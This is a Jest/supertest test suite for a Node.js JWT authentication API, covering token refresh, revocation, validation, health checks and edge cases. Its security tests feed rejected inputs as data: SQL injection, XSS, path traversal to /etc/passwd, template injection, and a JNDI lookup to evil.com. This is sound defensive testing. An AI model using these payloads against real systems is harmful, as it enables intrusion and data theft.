const request = require('supertest');
const app = require('../app');
const jwt = require('../utils/jwt');
const User = require('../models/users/user.model');
const { BlacklistToken } = require('../models/auth');

// Mock dependencies
jest.mock('../utils/jwt');
jest.mock('../models/users/user.model');
jest.mock('../models/auth');

// Base API path for tests
const API_BASE = '/api/v1/auth';

describe('Comprehensive Authentication Service Test Suite', () => {
  let mockUser;
  let validRefreshToken;
  let validAccessToken;
  let validTokenId;

  beforeEach(() => {
    // Reset all mocks
    jest.clearAllMocks();

    // Setup mock user
    mockUser = {
      _id: '64a7b8c9d0e1f2a3b4c5d6e7',
      email: 'testuser@example.com',
      firstName: 'Test',
      lastName: 'User',
      role: 'user',
      save: jest.fn().mockResolvedValue(true)
    };

    validTokenId = 'token-id-12345';
    validRefreshToken = 'valid.refresh.token.jwt';
    validAccessToken = 'valid.access.token.jwt';

    // Default mock implementations
    User.findById.mockResolvedValue(mockUser);
    BlacklistToken.findOne.mockResolvedValue(null);
    jwt.verifyToken.mockImplementation((token, type) => {
      if (token === validRefreshToken && type === 'refresh') {
        return { userId: mockUser._id, tokenId: validTokenId, iat: Date.now(), exp: Date.now() + 7 * 24 * 60 * 60 * 1000 };
      }
      if (token === validAccessToken && type === 'access') {
        return { userId: mockUser._id, email: mockUser.email, iat: Date.now(), exp: Date.now() + 15 * 60 * 1000 };
      }
      throw new Error('Token verification failed');
    });
    jwt.generateTokens.mockReturnValue({
      accessToken: 'new.access.token',
      refreshToken: 'new.refresh.token',
      tokenId: 'new-token-id'
    });
    jwt.blacklistToken.mockResolvedValue(true);
    jwt.isTokenBlacklisted.mockResolvedValue(false);
  });

  describe('POST /api/v1/auth/refresh - Token Refresh Endpoint', () => {
    describe('Successful Token Refresh', () => {
      it('should successfully refresh tokens with valid refresh token in both body and cookie', async () => {
        const response = await request(app)
          .post(`${API_BASE}/refresh`)
          .set('Cookie', `refreshToken=${validRefreshToken}`)
          .send({ refreshToken: validRefreshToken })
          .expect(200);

        expect(response.body).toHaveProperty('accessToken', 'new.access.token');
        expect(response.body.user).toEqual({
          id: mockUser._id,
          email: mockUser.email,
          role: mockUser.role
        });
      });

      it('should call JWT utility functions with correct parameters', async () => {
        await request(app)
          .post(`${API_BASE}/refresh`)
          .set('Cookie', `refreshToken=${validRefreshToken}`)
          .send({ refreshToken: validRefreshToken })
          .expect(200);

        expect(jwt.verifyToken).toHaveBeenCalledWith(validRefreshToken, 'refresh');
        expect(jwt.isTokenBlacklisted).toHaveBeenCalledWith(validTokenId);
        expect(jwt.generateTokens).toHaveBeenCalledWith(mockUser);
        expect(jwt.blacklistToken).toHaveBeenCalledWith(validTokenId, mockUser._id);
      });
    });

    describe('Bad Request (400) Error Cases', () => {
      it('should return 400 when refresh token is missing from request body', async () => {
        const response = await request(app)
          .post(`${API_BASE}/refresh`)
          .set('Cookie', `refreshToken=${validRefreshToken}`)
          .send({})
          .expect(400);

        expect(response.body.message).toContain('Refresh token required');
      });

      it('should return 400 when refresh token is missing from cookie', async () => {
        const response = await request(app)
          .post(`${API_BASE}/refresh`)
          .send({ refreshToken: validRefreshToken })
          .expect(400);

        expect(response.body.message).toContain('Refresh token required');
      });

      it('should return 400 when tokens in body and cookie do not match', async () => {
        const response = await request(app)
          .post(`${API_BASE}/refresh`)
          .set('Cookie', 'refreshToken=different.token')
          .send({ refreshToken: validRefreshToken })
          .expect(400);

        expect(response.body.message).toContain('Token mismatch');
      });

      it('should return 400 with validation errors for empty refresh token', async () => {
        const response = await request(app)
          .post(`${API_BASE}/refresh`)
          .set('Cookie', 'refreshToken=')
          .send({ refreshToken: '' })
          .expect(400);

        expect(response.body.message).toContain('Refresh token required');
      });

      it('should return 400 when refresh token exceeds maximum length', async () => {
        const longToken = 'a'.repeat(2049);
        
        const response = await request(app)
          .post(`${API_BASE}/refresh`)
          .set('Cookie', `refreshToken=${longToken}`)
          .send({ refreshToken: longToken })
          .expect(400);

        expect(response.body.message).toContain('Token too long');
      });
    });

    describe('Unauthorized (401) Error Cases', () => {
      it('should return 401 when refresh token signature is invalid', async () => {
        jwt.verifyToken.mockImplementation(() => {
          throw new Error('Invalid signature');
        });

        const response = await request(app)
          .post(`${API_BASE}/refresh`)
          .set('Cookie', `refreshToken=${validRefreshToken}`)
          .send({ refreshToken: validRefreshToken })
          .expect(401);

        expect(response.body.message).toContain('Invalid or expired refresh token');
      });

      it('should return 401 when refresh token is expired', async () => {
        jwt.verifyToken.mockImplementation(() => {
          throw new Error('Token expired');
        });

        const response = await request(app)
          .post(`${API_BASE}/refresh`)
          .set('Cookie', `refreshToken=${validRefreshToken}`)
          .send({ refreshToken: validRefreshToken })
          .expect(401);

        expect(response.body.message).toContain('Invalid or expired refresh token');
      });

      it('should return 401 when refresh token is blacklisted', async () => {
        jwt.isTokenBlacklisted.mockResolvedValue(true);

        const response = await request(app)
          .post(`${API_BASE}/refresh`)
          .set('Cookie', `refreshToken=${validRefreshToken}`)
          .send({ refreshToken: validRefreshToken })
          .expect(401);

        expect(response.body.message).toContain('Refresh token revoked');
      });
    });

    describe('Not Found (404) Error Cases', () => {
      it('should return 404 when user associated with token is not found', async () => {
        User.findById.mockResolvedValue(null);

        const response = await request(app)
          .post(`${API_BASE}/refresh`)
          .set('Cookie', `refreshToken=${validRefreshToken}`)
          .send({ refreshToken: validRefreshToken })
          .expect(404);

        expect(response.body.message).toContain('User not found');
      });
    });

    describe('Server Error (500) Cases', () => {
      it('should return 500 when database operation fails', async () => {
        User.findById.mockRejectedValue(new Error('Database connection failed'));

        const response = await request(app)
          .post(`${API_BASE}/refresh`)
          .set('Cookie', `refreshToken=${validRefreshToken}`)
          .send({ refreshToken: validRefreshToken })
          .expect(500);

        expect(response.body.message).toContain('Server error');
      });

      it('should return 500 when token generation fails', async () => {
        jwt.generateTokens.mockImplementation(() => {
          throw new Error('Token generation failed');
        });

        const response = await request(app)
          .post(`${API_BASE}/refresh`)
          .set('Cookie', `refreshToken=${validRefreshToken}`)
          .send({ refreshToken: validRefreshToken })
          .expect(500);

        expect(response.body.message).toContain('Server error');
      });
    });
  });

  describe('POST /api/v1/auth/revoke - Token Revoke Endpoint', () => {
    describe('Successful Token Revocation', () => {
      it('should successfully revoke refresh token and clear cookie', async () => {
        const response = await request(app)
          .post(`${API_BASE}/revoke`)
          .set('Cookie', `refreshToken=${validRefreshToken}`)
          .send({ refreshToken: validRefreshToken })
          .expect(204);

        expect(response.body).toEqual({});
        expect(jwt.blacklistToken).toHaveBeenCalledWith(validTokenId, mockUser._id);
      });
    });

    describe('Bad Request (400) Error Cases', () => {
      it('should return 400 when refresh token is missing from request body', async () => {
        const response = await request(app)
          .post(`${API_BASE}/revoke`)
          .set('Cookie', `refreshToken=${validRefreshToken}`)
          .send({})
          .expect(400);

        expect(response.body.message).toContain('Refresh token required');
      });

      it('should return 400 when refresh token is missing from cookie', async () => {
        const response = await request(app)
          .post(`${API_BASE}/revoke`)
          .send({ refreshToken: validRefreshToken })
          .expect(400);

        expect(response.body.message).toContain('Refresh token required');
      });

      it('should return 400 when tokens in body and cookie do not match', async () => {
        const response = await request(app)
          .post(`${API_BASE}/revoke`)
          .set('Cookie', 'refreshToken=different.token')
          .send({ refreshToken: validRefreshToken })
          .expect(400);

        expect(response.body.message).toContain('Token mismatch');
      });
    });

    describe('Unauthorized (401) Error Cases', () => {
      it('should return 401 when refresh token signature is invalid', async () => {
        jwt.verifyToken.mockImplementation(() => {
          throw new Error('Invalid signature');
        });

        const response = await request(app)
          .post(`${API_BASE}/revoke`)
          .set('Cookie', `refreshToken=${validRefreshToken}`)
          .send({ refreshToken: validRefreshToken })
          .expect(401);

        expect(response.body.message).toContain('Invalid refresh token');
      });
    });

    describe('Not Found (404) Error Cases', () => {
      it('should return 404 when user associated with token is not found', async () => {
        User.findById.mockResolvedValue(null);

        const response = await request(app)
          .post(`${API_BASE}/revoke`)
          .set('Cookie', `refreshToken=${validRefreshToken}`)
          .send({ refreshToken: validRefreshToken })
          .expect(404);

        expect(response.body.message).toContain('Refresh token not found');
      });
    });

    describe('Server Error (500) Cases', () => {
      it('should return 500 when blacklist operation fails', async () => {
        jwt.blacklistToken.mockRejectedValue(new Error('Database error'));

        const response = await request(app)
          .post(`${API_BASE}/revoke`)
          .set('Cookie', `refreshToken=${validRefreshToken}`)
          .send({ refreshToken: validRefreshToken })
          .expect(500);

        expect(response.body.message).toContain('Server error');
      });
    });
  });

  describe('GET /api/v1/auth/validate - Session Validation Endpoint', () => {
    describe('Successful Token Validation', () => {
      it('should successfully validate access token and return user data', async () => {
        const response = await request(app)
          .get(`${API_BASE}/validate`)
          .set('Authorization', `Bearer ${validAccessToken}`)
          .expect(200);

        expect(response.body.user).toEqual({
          id: mockUser._id,
          email: mockUser.email,
          role: mockUser.role
        });
        expect(response.body).toHaveProperty('valid', true);
      });

      it('should extract token correctly from Authorization header', async () => {
        await request(app)
          .get(`${API_BASE}/validate`)
          .set('Authorization', `Bearer ${validAccessToken}`)
          .expect(200);

        expect(jwt.verifyToken).toHaveBeenCalledWith(validAccessToken, 'access');
      });
    });

    describe('Unauthorized (401) Error Cases', () => {
      it('should return 401 when Authorization header is missing', async () => {
        const response = await request(app)
          .get(`${API_BASE}/validate`)
          .expect(401);

        expect(response.body.message).toContain('Access token required');
      });

      it('should return 401 when Bearer token is malformed', async () => {
        const response = await request(app)
          .get(`${API_BASE}/validate`)
          .set('Authorization', 'InvalidFormat token.here')
          .expect(401);

        expect(response.body.message).toContain('Invalid token format');
      });

      it('should return 401 when Authorization header has no token after Bearer', async () => {
        const response = await request(app)
          .get(`${API_BASE}/validate`)
          .set('Authorization', 'Bearer ')
          .expect(401);

        expect(response.body.message).toContain('Invalid token format');
      });

      it('should return 401 when Authorization header is just "Bearer"', async () => {
        const response = await request(app)
          .get(`${API_BASE}/validate`)
          .set('Authorization', 'Bearer')
          .expect(401);

        expect(response.body.message).toContain('Invalid token format');
      });

      it('should return 401 when access token is too long', async () => {
        const longToken = 'c'.repeat(2049);
        
        const response = await request(app)
          .get(`${API_BASE}/validate`)
          .set('Authorization', `Bearer ${longToken}`)
          .expect(401);

        expect(response.body.message).toContain('Token too long');
      });

      it('should return 401 when access token signature is invalid', async () => {
        jwt.verifyToken.mockImplementation(() => {
          throw new Error('Invalid signature');
        });

        const response = await request(app)
          .get(`${API_BASE}/validate`)
          .set('Authorization', `Bearer ${validAccessToken}`)
          .expect(401);

        expect(response.body.message).toContain('Invalid or expired access token');
      });

      it('should return 401 when access token is expired', async () => {
        jwt.verifyToken.mockImplementation(() => {
          throw new Error('Token expired');
        });

        const response = await request(app)
          .get(`${API_BASE}/validate`)
          .set('Authorization', `Bearer ${validAccessToken}`)
          .expect(401);

        expect(response.body.message).toContain('Invalid or expired access token');
      });

      it('should return 401 when user associated with token is not found', async () => {
        User.findById.mockResolvedValue(null);

        const response = await request(app)
          .get(`${API_BASE}/validate`)
          .set('Authorization', `Bearer ${validAccessToken}`)
          .expect(401);

        expect(response.body.message).toContain('User not found');
      });
    });

    describe('Server Error (500) Cases', () => {
      it('should return 500 when database lookup fails', async () => {
        User.findById.mockRejectedValue(new Error('Database connection error'));

        const response = await request(app)
          .get(`${API_BASE}/validate`)
          .set('Authorization', `Bearer ${validAccessToken}`)
          .expect(500);

        expect(response.body.message).toContain('Server error');
      });
    });
  });

  describe('GET /api/v1/auth/health - Health Check Endpoint', () => {
    describe('Health Check Tests', () => {
      it('should return 200 for health check endpoint', async () => {
        const response = await request(app)
          .get(`${API_BASE}/health`)
          .expect(200);

        expect(response.body).toEqual({
          status: 'OK',
          timestamp: expect.any(String),
          service: 'authentication'
        });
      });

      it('should include proper headers in health check response', async () => {
        const response = await request(app)
          .get(`${API_BASE}/health`)
          .expect(200);

        expect(response.headers['content-type']).toMatch(/application\/json/);
      });

      it('should handle health check with query parameters', async () => {
        const response = await request(app)
          .get(`${API_BASE}/health?detailed=true`)
          .expect(200);

        expect(response.body.status).toBe('OK');
      });
    });
  });

  describe('Integration Tests', () => {
    describe('Token Lifecycle', () => {
      it('should support complete token lifecycle: refresh -> validate -> revoke', async () => {
        // 1. Refresh token
        const refreshResponse = await request(app)
          .post(`${API_BASE}/refresh`)
          .set('Cookie', `refreshToken=${validRefreshToken}`)
          .send({ refreshToken: validRefreshToken })
          .expect(200);

        const newAccessToken = refreshResponse.body.accessToken;

        // 2. Validate new access token
        jwt.verifyToken.mockImplementation((token, type) => {
          if (token === newAccessToken && type === 'access') {
            return { userId: mockUser._id, email: mockUser.email };
          }
          if (token === 'new.refresh.token' && type === 'refresh') {
            return { userId: mockUser._id, tokenId: 'new-token-id' };
          }
          throw new Error('Token verification failed');
        });

        await request(app)
          .get(`${API_BASE}/validate`)
          .set('Authorization', `Bearer ${newAccessToken}`)
          .expect(200);

        // 3. Revoke refresh token
        await request(app)
          .post(`${API_BASE}/revoke`)
          .set('Cookie', 'refreshToken=new.refresh.token')
          .send({ refreshToken: 'new.refresh.token' })
          .expect(204);
      });
    });

    describe('Security Tests', () => {
      it('should prevent token reuse after revocation', async () => {
        // Revoke token
        await request(app)
          .post(`${API_BASE}/revoke`)
          .set('Cookie', `refreshToken=${validRefreshToken}`)
          .send({ refreshToken: validRefreshToken })
          .expect(204);

        // Mock blacklisted token
        jwt.isTokenBlacklisted.mockResolvedValue(true);

        // Try to use revoked token
        const response = await request(app)
          .post(`${API_BASE}/refresh`)
          .set('Cookie', `refreshToken=${validRefreshToken}`)
          .send({ refreshToken: validRefreshToken })
          .expect(401);

        expect(response.body.message).toContain('revoked');
      });

      it('should handle concurrent refresh requests safely', async () => {
        const concurrentRequests = [];
        for (let i = 0; i < 3; i++) {
          concurrentRequests.push(
            request(app)
              .post(`${API_BASE}/refresh`)
              .set('Cookie', `refreshToken=${validRefreshToken}`)
              .send({ refreshToken: validRefreshToken })
          );
        }

        const responses = await Promise.all(concurrentRequests);
        
        // At least one should succeed
        const successfulResponses = responses.filter(res => res.status === 200);
        expect(successfulResponses.length).toBeGreaterThan(0);
      });
    });
  });

  describe('Edge Cases', () => {
    it('should handle empty request body gracefully', async () => {
      const response = await request(app)
        .post(`${API_BASE}/refresh`)
        .send()
        .expect(400);

      expect(response.body.message).toBeDefined();
    });

    it('should handle malformed JSON in request body', async () => {
      const response = await request(app)
        .post(`${API_BASE}/refresh`)
        .set('Content-Type', 'application/json')
        .send('{"malformed": json}')
        .expect(400);

      expect(response.body.message).toBeDefined();
    });

    it('should handle very long token strings', async () => {
      const longToken = 'a'.repeat(10000);

      const response = await request(app)
        .post(`${API_BASE}/refresh`)
        .set('Cookie', `refreshToken=${longToken}`)
        .send({ refreshToken: longToken })
        .expect(400);

      expect(response.body.message).toBeDefined();
    });

    it('should handle special characters in tokens', async () => {
      const specialToken = 'token.with.special@chars#$%^&*()';

      const response = await request(app)
        .post(`${API_BASE}/refresh`)
        .set('Cookie', `refreshToken=${specialToken}`)
        .send({ refreshToken: specialToken })
        .expect(401);

      expect(response.body.message).toContain('Invalid');
    });

    it('should handle null values in request body', async () => {
      const response = await request(app)
        .post(`${API_BASE}/refresh`)
        .send({ refreshToken: null })
        .expect(400);

      expect(response.body.message).toBeDefined();
    });

    it('should handle SQL injection attempts in token', async () => {
      const sqlInjectionToken = "'; DROP TABLE users; --";

      const response = await request(app)
        .post(`${API_BASE}/refresh`)
        .set('Cookie', `refreshToken=${encodeURIComponent(sqlInjectionToken)}`)
        .send({ refreshToken: sqlInjectionToken })
        .expect(401);

      expect(response.body.message).toContain('Invalid');
    });

    it('should handle XSS attempts in Authorization header', async () => {
      const xssPayload = '<script>alert("xss")</script>';

      const response = await request(app)
        .get(`${API_BASE}/validate`)
        .set('Authorization', `Bearer ${xssPayload}`)
        .expect(401);

      expect(response.body.message).toContain('Invalid');
    });
  });

  describe('Advanced Security Tests', () => {
    it('should not expose sensitive information in error messages', async () => {
      const sensitiveToken = 'sensitive.secret.information';
      
      const response = await request(app)
        .post(`${API_BASE}/refresh`)
        .set('Cookie', `refreshToken=${sensitiveToken}`)
        .send({ refreshToken: sensitiveToken })
        .expect(401);

      // Error message should not contain the actual token
      expect(response.body.message).not.toContain(sensitiveToken);
      expect(response.body.message).not.toContain('secret');
      expect(response.body.message).not.toContain('sensitive');
    });

    it('should handle requests with suspicious patterns', async () => {
      const suspiciousTokens = [
        '../../../etc/passwd',
        '{{7*7}}',
        '${jndi:ldap://evil.com}',
        '<img src=x onerror=alert(1)>'
      ];

      for (const token of suspiciousTokens) {
        const response = await request(app)
          .post(`${API_BASE}/refresh`)
          .set('Cookie', `refreshToken=${encodeURIComponent(token)}`)
          .send({ refreshToken: token });

        // Should reject all suspicious patterns
        expect([400, 401]).toContain(response.status);
        // Should not expose the suspicious content
        expect(response.body.message).not.toContain(token);
      }
    });

    it('should handle session fixation attempts', async () => {
      const fixedToken = 'fixed.session.token';
      
      jwt.verifyToken.mockImplementation(() => {
        throw new Error('Invalid signature');
      });

      const response = await request(app)
        .post(`${API_BASE}/refresh`)
        .set('Cookie', `refreshToken=${fixedToken}`)
        .send({ refreshToken: fixedToken })
        .expect(401);

      expect(response.body.message).toContain('Invalid');
    });
  });

  // Cleanup after all tests
  afterAll(async () => {
    const mongoose = require('mongoose');
    if (mongoose.connection.readyState !== 0) {
      await mongoose.connection.close();
    }
  });
});